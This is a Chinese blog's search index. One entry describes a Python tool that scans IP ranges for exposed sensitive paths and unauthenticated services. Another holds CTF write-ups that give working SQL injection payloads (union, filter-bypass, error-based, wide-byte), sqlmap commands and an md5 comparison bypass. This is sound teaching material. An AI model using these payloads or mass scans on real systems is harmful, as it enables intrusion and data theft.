<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>IDscan</title>
    <url>/2021/07/28/IDscan/</url>
    <content><![CDATA[<p>一个针对URL的简单敏感信息扫描器</p>
<p>此工具可以类似于dirsearch，如果字典足够大，完全可以达到相同的效果</p>
<span id="more"></span>

<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote>
<p>python3</p>
<p>使用的库： threadpool</p>
<p>pip install requests threadpool</p>
</blockquote>
<p>主要文件</p>
<ul>
<li>IDscan<ul>
<li>get_ip_list.py<ul>
<li>讲IP段转换成ip列表，再进行扫描</li>
</ul>
</li>
<li>IDscan.py<ul>
<li>threadpool  使用多线程加快扫描速度</li>
<li>random User-Agent   随机使用代理防止被封</li>
</ul>
</li>
<li>rules.txt<ul>
<li>漏洞规则</li>
</ul>
</li>
<li>url_list.txt<ul>
<li>将被检测内容填入其中</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h1><p>该脚本可以实现三种类型的扫描，关键在于网端测试，将网端转换为ip列表，再对每一个ip进行扫描</p>
<ul>
<li>网段</li>
<li>单个或多个网址</li>
<li>某个网站的特殊端口</li>
</ul>
<h2 id="探测原理"><a href="#探测原理" class="headerlink" title="探测原理"></a>探测原理</h2><p>将rule.txt中可能存在泄露的url与待检测的网址拼接后，进行访问，之后查看状态码，若为200则可能存在敏感信息泄露。</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">target</span>):</span>
    headers_list = [
    <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#x27;</span>,
    <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0&#x27;</span>,
    <span class="hljs-string">&#x27;Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&#x27;</span>,
    <span class="hljs-string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1&#x27;</span>,
    <span class="hljs-string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14D27 UCBrowser/11.6.1.1003 Mobile  AliApp(TUnionSDK/0.1.20)&#x27;</span>,
    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;</span>,
    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,
    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,
    <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span>,
    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span>
    ]
    headers = &#123; <span class="hljs-string">&#x27;User-Agent&#x27;</span>: random.choice(headers_list) &#125;
    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rules.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)
    txt = f.readlines()
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> txt:
        u,j,w = x.strip().split(<span class="hljs-string">&#x27;|&#x27;</span>)
        url = target + u
        <span class="hljs-keyword">try</span>:
            r = requests.get(url,headers=headers,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>) <span class="hljs-comment"># http</span>
            html = r.text
            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:
                <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> html:
                    print(<span class="hljs-string">&#x27;Find: &#x27;</span> + url +<span class="hljs-string">&#x27; is Leak !!! Leak is &#x27;</span>+ w)
                <span class="hljs-keyword">else</span>:
                    print(<span class="hljs-string">&#x27;Find: &#x27;</span> + url +<span class="hljs-string">&#x27; is Exist !!!&#x27;</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">pass</span></code></pre>



<h2 id="网端测试"><a href="#网端测试" class="headerlink" title="网端测试"></a>网端测试</h2><p>将ip网端转换为ip列表 </p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sys

base = [<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)] + [ <span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+<span class="hljs-number">6</span>)]

<span class="hljs-comment">#十进制0~255转化为二进制,补0到8位</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec2bin80</span>(<span class="hljs-params">string_num</span>):</span>
    num = <span class="hljs-built_in">int</span>(string_num)
    mid = []
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>
        num,rem = <span class="hljs-built_in">divmod</span>(num, <span class="hljs-number">2</span>)
        mid.append(base[rem])

    result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mid[::-<span class="hljs-number">1</span>]])
    length = <span class="hljs-built_in">len</span>(result)
    <span class="hljs-keyword">if</span> length &lt; <span class="hljs-number">8</span>:
        result = <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">8</span> - length) + result
    <span class="hljs-keyword">return</span> result


<span class="hljs-comment">#十进制0~255转化为二进制,补0到32位</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec2bin320</span>(<span class="hljs-params">string_num</span>):</span>
    num = <span class="hljs-built_in">int</span>(string_num)
    mid = []
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>
        num,rem = <span class="hljs-built_in">divmod</span>(num, <span class="hljs-number">2</span>)
        mid.append(base[rem])

    result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mid[::-<span class="hljs-number">1</span>]])
    length = <span class="hljs-built_in">len</span>(result)
    <span class="hljs-keyword">if</span> length &lt; <span class="hljs-number">32</span>:
        result = <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">32</span> - length) + result
    <span class="hljs-keyword">return</span> result


<span class="hljs-comment">#十进制0~255转化为二进制，不补零</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec2bin</span>(<span class="hljs-params">string_num</span>):</span>
    num = <span class="hljs-built_in">int</span>(string_num)
    mid = []
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>
        num,rem = <span class="hljs-built_in">divmod</span>(num, <span class="hljs-number">2</span>)
        mid.append(base[rem])

    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mid[::-<span class="hljs-number">1</span>]])


<span class="hljs-comment">#二进制转换为十进制</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin2dec</span>(<span class="hljs-params">string_num</span>):</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(string_num, <span class="hljs-number">2</span>))

<span class="hljs-comment">#ip列表生成</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iplist</span>(<span class="hljs-params">string_startip,string_endip</span>):</span>

    <span class="hljs-comment">#分割IP，然后将其转化为8位的二进制代码</span>
    start = string_startip.split(<span class="hljs-string">&#x27;.&#x27;</span>)
    start_a = dec2bin80(start[<span class="hljs-number">0</span>])
    start_b = dec2bin80(start[<span class="hljs-number">1</span>])
    start_c = dec2bin80(start[<span class="hljs-number">2</span>])
    start_d = dec2bin80(start[<span class="hljs-number">3</span>])
    start_bin = start_a + start_b + start_c + start_d
    <span class="hljs-comment">#将二进制代码转化为十进制</span>
    start_dec = bin2dec(start_bin)

    end = string_endip.split(<span class="hljs-string">&#x27;.&#x27;</span>)
    end_a = dec2bin80(end[<span class="hljs-number">0</span>])
    end_b = dec2bin80(end[<span class="hljs-number">1</span>])
    end_c = dec2bin80(end[<span class="hljs-number">2</span>])
    end_d = dec2bin80(end[<span class="hljs-number">3</span>])
    end_bin = end_a + end_b + end_c + end_d
    <span class="hljs-comment">#将二进制代码转化为十进制</span>
    end_dec = bin2dec(end_bin)

    <span class="hljs-comment">#十进制相减，获取两个IP之间有多少个IP</span>
    count = <span class="hljs-built_in">int</span>(end_dec) - <span class="hljs-built_in">int</span>(start_dec)

    ip_list = []
    <span class="hljs-comment">#生成IP列表</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,count + <span class="hljs-number">1</span>):
        <span class="hljs-comment">#将十进制IP加一，再转化为二进制（32位补齐）</span>
        plusone_dec = <span class="hljs-built_in">int</span>(start_dec) + i
        plusone_dec = <span class="hljs-built_in">str</span>(plusone_dec)
        address_bin = dec2bin320(plusone_dec)
        <span class="hljs-comment">#分割IP，转化为十进制</span>
        address_a = bin2dec(address_bin[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])
        address_b = bin2dec(address_bin[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])
        address_c = bin2dec(address_bin[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>])
        address_d = bin2dec(address_bin[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>])
        address = address_a + <span class="hljs-string">&#x27;.&#x27;</span>+ address_b +<span class="hljs-string">&#x27;.&#x27;</span>+ address_c +<span class="hljs-string">&#x27;.&#x27;</span>+ address_d
        ip_list.append(address)
    <span class="hljs-keyword">return</span> ip_list</code></pre>



<h2 id="扫描规则"><a href="#扫描规则" class="headerlink" title="扫描规则"></a>扫描规则</h2><p>这里定义了一些常见的敏感信息的url，主函数通过一行一行读取该文件中的内容，然后与网址拼接后访问</p>
<pre><code class="hljs coq">/.svn/entries|<span class="hljs-type">dir</span>|<span class="hljs-type">SVN</span>信息泄露
/.git/config|<span class="hljs-type">[core</span>]|<span class="hljs-type">Git</span>信息泄露
/.git/config|<span class="hljs-type">repositoryformatversion</span>|<span class="hljs-type">Git</span>信息泄露
.git/refs/stash|<span class="hljs-type">|git</span> stash 泄露
/CVS/Root|<span class="hljs-type">|cvs</span>信息泄露
/CVS/Entries|<span class="hljs-type">|cvs</span>信息泄露
/.hg/|<span class="hljs-type">|.hg</span>源码泄漏
/.bzr/|<span class="hljs-type">|.bzr</span>信息泄露
/.DS_Store|<span class="hljs-type">|DS_Store</span>文件泄露
/htaccess.txt|<span class="hljs-type">|访问控制文件泄露</span>
<span class="hljs-type">/.index</span>.php.swp|<span class="hljs-type">|vim</span>交换文件名
/.index.php.swn|<span class="hljs-type">|vim</span>交换文件名
/.index.php.swo|<span class="hljs-type">|vim</span>交换文件名
/WEB-INF/web.xml|<span class="hljs-type">&lt;?xml</span> version=|<span class="hljs-type">初始化工程配置信息泄露</span>
<span class="hljs-type">/WEB</span>-INF/web.xml|<span class="hljs-type">&lt;web</span>-app|<span class="hljs-type">初始化工程配置信息泄露</span>
<span class="hljs-type">/crossdomin</span>.xml|<span class="hljs-type">cross</span>-domain-policy|<span class="hljs-type">跨域策略文件</span>
<span class="hljs-type">/icons</span>/|<span class="hljs-type">Index</span> of|<span class="hljs-type">目录遍历路径</span>
<span class="hljs-type">/robots</span>.txt|<span class="hljs-type">Disallow</span>|<span class="hljs-type">爬虫配置文件</span>
<span class="hljs-type">/uddiexplorer</span>/SearchPublicRegistries.jsp|<span class="hljs-type">Search</span> public registries|<span class="hljs-type">Weblogic</span> 服务器请求伪造漏洞
/ws_utc/config.<span class="hljs-built_in">do</span>|<span class="hljs-type">tc_container</span>|<span class="hljs-type">Oracle</span> WebLogic ws-utc 任意文件上传漏洞
:<span class="hljs-number">8080</span>/manage|<span class="hljs-type">|Jenkins</span>未授权访问可执行命令
:<span class="hljs-number">8080</span>/script|<span class="hljs-type">|Jenkins</span>未授权访问可执行命令
:<span class="hljs-number">9200</span>/|<span class="hljs-type">|build_hashElasticsearch</span>未授权访问
:<span class="hljs-number">9200</span>/_cat/indices|<span class="hljs-type">_river</span>|<span class="hljs-type">Elasticsearch</span>未授权访问
:<span class="hljs-number">9200</span>/_river/_search|<span class="hljs-type">node</span>|<span class="hljs-type">Elasticsearch</span>未授权访问
:<span class="hljs-number">5984</span>/_config/|<span class="hljs-type">httpd_design_handlers</span>|<span class="hljs-type">CouchDB</span>未授权访问
:<span class="hljs-number">2375</span>/containers/json|<span class="hljs-type">[|Docker</span>未授权访问
:<span class="hljs-number">8161</span>/admin/|<span class="hljs-type">|ActiveMQ</span>未授权访问
:<span class="hljs-number">7001</span>/_async/AsyncResponseService|<span class="hljs-type">|AsyncResponseService</span> RCE
/test.php|<span class="hljs-type">|测试页面</span>
<span class="hljs-type">/test</span>.cgi|<span class="hljs-type">|测试页面</span>
<span class="hljs-type">/info</span>.php|<span class="hljs-type">|测试页面</span>
<span class="hljs-type">/login</span>.php|<span class="hljs-type">|管理后台地址泄露</span>
<span class="hljs-type">/admin</span>.php|<span class="hljs-type">|管理后台地址泄露</span>
<span class="hljs-type">/manager</span>.php|<span class="hljs-type">|管理后台地址泄露</span>
<span class="hljs-type">/admin_login</span>.php|<span class="hljs-type">|管理后台地址泄露</span>
<span class="hljs-type">/.test</span>.php.swp|<span class="hljs-type">|编辑器备份文件泄露</span>
<span class="hljs-type">/test</span>.php.bak|<span class="hljs-type">|编辑器备份文件泄露</span>
<span class="hljs-type">/test</span>.jsp.old|<span class="hljs-type">|编辑器备份文件泄露</span>
<span class="hljs-type">/cgi</span>~|<span class="hljs-type">|编辑器备份文件泄露</span>
<span class="hljs-type">/phpmyadmin</span>|<span class="hljs-type">|phpmyadmin</span>后台泄露
/phpinfo.php|<span class="hljs-type">|phpinfo</span>页面泄露
/basic/index.php|<span class="hljs-type">|HTTP</span>认证泄露漏洞
/www.rar|<span class="hljs-type">|网站备份文件</span>
<span class="hljs-type">/web</span>.zip|<span class="hljs-type">|网站备份文件</span>
<span class="hljs-type">/www</span>.zip|<span class="hljs-type">|网站备份文件 </span>
<span class="hljs-type">/sitename</span>.tar.gz|<span class="hljs-type">|网站备份文件</span>
<span class="hljs-type">/_vti_inf</span>.html|<span class="hljs-type">|Frontpage</span> 信息泄漏
/_vti_pvt/service.pwd|<span class="hljs-type">|FrontPage</span> pwd 文件可读
/.bashrc|<span class="hljs-type">|bashrc</span> 信息泄漏
/.bash_profile|<span class="hljs-type">|profile</span> 信息泄露
/.zshrc|<span class="hljs-type">|zsh</span> 信息泄露</code></pre>

<h2 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    print(<span class="hljs-string">&#x27;*&#x27;</span>*<span class="hljs-number">35</span>+<span class="hljs-string">&#x27;&#x27;&#x27;\nIDscan V3.0\n</span>
<span class="hljs-string">Information disclosure Check.\n&#x27;&#x27;&#x27;</span>+<span class="hljs-string">&#x27;*&#x27;</span>*<span class="hljs-number">35</span>)
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url_list.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:
        url_l = f.readlines()
    pool = threadpool.ThreadPool(<span class="hljs-number">255</span>)
    ipl = []
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_l:
        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">in</span> i: <span class="hljs-comment"># website url</span>
            ipl.append(i.strip())
        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">in</span> i: <span class="hljs-comment"># network segment</span>
            start_ip,end_ip = i.split(<span class="hljs-string">&#x27;-&#x27;</span>)
            ipl.extend(get_ip_list.iplist(start_ip,end_ip))
        <span class="hljs-keyword">elif</span> checkip(i):
            ipl.append(i.strip())
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&#x27;Unknown form IP：&#x27;</span>+i)
    print(<span class="hljs-string">&#x27;Start...&#x27;</span>)
    
    rethr = threadpool.makeRequests(verify, ipl) <span class="hljs-comment"># connect rules</span>
    [pool.putRequest(req) <span class="hljs-keyword">for</span> req <span class="hljs-keyword">in</span> rethr]
    pool.wait()

    print(<span class="hljs-string">&#x27;End...&#x27;</span>)</code></pre>

<h1 id="url-list-txt-使用方法"><a href="#url-list-txt-使用方法" class="headerlink" title="url_list.txt 使用方法"></a>url_list.txt 使用方法</h1><ul>
<li><p><strong>如果你想扫描网段</strong></p>
<pre><code class="hljs accesslog"><span class="hljs-number">192.168.0.0</span>-<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span>
<span class="hljs-number">192.167.36.24</span>-<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">39</span>.<span class="hljs-number">255</span></code></pre>
</li>
<li><p><strong>if you want to scan special port | 如果你想扫描特殊端口</strong></p>
<pre><code class="hljs accesslog"><span class="hljs-number">192.168.0.1:8081</span></code></pre>
</li>
<li><p><strong>if you wang to scan website url| 如果你想扫描网站地址</strong></p>
<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.baidu.com
https:<span class="hljs-regexp">//</span>www.baidu.com
http:<span class="hljs-regexp">//</span>www.baidu.com:<span class="hljs-number">81</span></code></pre>

</li>
</ul>
<p>扫描百度的结果</p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210728175634955.png" alt="image-20210728175634955"></p>
<blockquote>
<p>参考:</p>
<p><a href="https://github.com/zhaijiahui/IDscan">https://github.com/zhaijiahui/IDscan</a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>scan</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku</title>
    <url>/2020/08/08/Bugku/</url>
    <content><![CDATA[<h1 id="Bugku刷题"><a href="#Bugku刷题" class="headerlink" title="Bugku刷题"></a>Bugku刷题</h1><span id="more"></span>

<h2 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h2><pre><code class="hljs html">1&#x27; and 1=1 #      
  
1&#x27; and 1=2 #</code></pre>
<p>   不显示内容，可以判断存在注入点</p>
<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><pre><code>` -1&apos; union select 1,database(),3,4 #`

     database:skctf_flag</code></pre><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre><p> table:fl4g,sc</p>
<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre><p> skctf_flag</p>
<p> 得到flag</p>
<p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
<p><img src="/2020/08/08/Bugku/cjd1.png" alt></p>
<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre><p><img src="/2020/08/08/Bugku/cjd2.png" alt></p>
<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre><p><img src="/2020/08/08/Bugku/cjd3.png" alt></p>
<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre><p><img src="/2020/08/08/Bugku/cjd4.png" alt></p>
<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre><p><img src="/2020/08/08/Bugku/cjd5.png" alt></p>
<hr>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">/**</span>
<span class="hljs-comment"> * Created by PhpStorm.</span>
<span class="hljs-comment"> * User: Norse</span>
<span class="hljs-comment"> * Date: 2017/8/6</span>
<span class="hljs-comment"> * Time: 20:22</span>
<span class="hljs-comment">*/</span>

<span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
<span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);
<span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);
<span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);
parse_str(<span class="hljs-variable">$str</span>);
<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);

<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);
<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;取得flag&quot;</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>


<p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
<p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
<p> 2.利用==比较漏洞</p>
<p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
<p> 下列的字符串的MD5值都是0e开头的：</p>
<pre><code>QNKCDZO

240610708

s878926199a

s155964671a

s214587387a

s214587387a</code></pre><hr>
<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
<p>database:<strong>web1002-1</strong></p>
<p>爆表名</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre><p>flag1,hint</p>
<p>爆字段名</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre><p>flag1,address<br>获取内容</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre><p><strong>usOwycTju+FTUUzXosjr</strong></p>
<p>提交发现不对</p>
<pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre><p>获取address中的内容</p>
<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre><p>Unknown column ‘flag2’ in ‘where clause’</p>
<pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
<p><strong>！！！注意把flag改为小写字母</strong></p>
<hr>
<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
<h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre><p>加单引号报错</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre><p>查看所有的表</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre><p>查看表中的列</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
<p>获取字段内容</p>
<pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
<h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre><p>获取数据库名</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
 --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre><p>获取表名</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre><p>获取flag</p>
<pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre><p><img src="/2020/08/08/Bugku/k1.png" alt></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>guestbook</title>
    <url>/2020/04/18/Guestbook/</url>
